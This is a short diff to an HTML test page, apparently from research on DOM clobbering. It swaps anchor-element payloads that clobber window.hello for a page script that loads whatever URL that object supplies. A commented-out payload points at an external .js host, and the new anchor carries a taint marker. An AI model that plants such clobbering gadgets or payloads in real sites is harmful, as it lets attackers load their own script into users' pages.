@@ -5,9 +5,10 @@
 </head>
 <body>
     /////clobbering payload/////
-    <a id="hello"><\a>
+<!--     <a id="hello"><\a> -->
 <!--     <a id="hello" name=url href="https://gaeunbae.github.io/hello.js"></a> -->
     ///////////////////////////
+    <a id="hello" href="clobbered:TAINT_window_hello_1_1"></a>
   
     <script>
         let someObject = window.hello || {};
@@ -15,7 +16,7 @@
             let script = document.createElement('script');
             script.setAttribute('src', someObject.url);
             script.src = someObject.url;
-            // console.log(someObject.url);
+            console.log(someObject.url);
             document.body.appendChild(script);
         }
         
